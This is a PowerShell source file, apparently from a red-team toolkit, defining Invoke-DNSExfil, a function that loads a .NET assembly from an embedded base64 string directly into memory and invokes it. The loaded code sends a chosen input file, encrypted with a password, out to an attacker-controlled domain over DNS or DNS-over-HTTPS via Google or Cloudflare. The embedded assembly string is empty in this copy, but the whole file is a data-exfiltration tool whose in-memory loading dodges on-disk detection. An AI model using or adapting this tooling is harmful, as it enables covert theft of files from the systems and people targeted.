function Invoke-DNSExfil
{
    
    [CmdletBinding()]
        Param (

        [Parameter(Mandatory = $True)]
        [Alias('i')]
    	[ValidateNotNullOrEmpty()]
    	[String]$InputFile,
        
    	[Parameter(Mandatory = $True)]
        [Alias('d')]
    	[ValidateNotNullOrEmpty()]
    	[String]$DomainName,

        [Parameter(Mandatory = $True)]
        [Alias('p')]
    	[ValidateNotNullOrEmpty()]
    	[String]$Password,
        
        [Parameter(Mandatory = $False)]
        [Alias('b32')]
        [switch]$UseBase32,
        
        [Parameter(Mandatory = $False)]
        [Alias('h')]
        [ValidateSet("google","cloudflare")]
        [String]$DoHProvider,
        
        [Parameter(Mandatory = $False)]
        [Alias('s')]
        [ValidateNotNullOrEmpty()]
        [String]$DNSServer,
        
        [Parameter(Mandatory = $False)]
        [Alias('t')]
        [ValidateNotNullOrEmpty()]
        [int]$ThrottleTime,
        
        [Parameter(Mandatory = $False)]
        [Alias('r')]
        [ValidateNotNullOrEmpty()]
        [int]$RequestMaxSize,
        
        [Parameter(Mandatory = $False)]
        [Alias('l')]
        [ValidateNotNullOrEmpty()]
        [int]$LabelMaxSize
    )

    $base64String = ""
    
    $DNSExfiltratorLib = [System.Convert]::FromBase64String($base64String)
    	
    [System.Reflection.Assembly]::Load($DNSExfiltratorLib) | Out-Null
    
    # Prepare arguments
    $Args = [System.Collections.ArrayList]@()
    $Args.Add($InputFile) | Out-Null
    $Args.Add($DomainName)  | Out-Null
    $Args.Add($Password)  | Out-Null
    
    if ($UseBase32) {
        $Args.Add("-b32")  | Out-Null
    }
    if ($DoHProvider) {
        $Args.Add("h=$DoHProvider")  | Out-Null
    }
    if ($DNSServer) {
        $Args.Add("s=$DNSServer")  | Out-Null
    }
    if ($ThrottleTime) {
        $Args.Add("t=$ThrottleTime") | Out-Null
    }
    if ($RequestMaxSize) {
        $Args.Add("r=$RequestMaxSize") | Out-Null
    }
    if ($LabelMaxSize) {
        $Args.Add("l=$LabelMaxSize") | Out-Null
    }
    
    # Invoke the Main entry point
    [DNSExfil.DNSExfil]::Main($Args)
}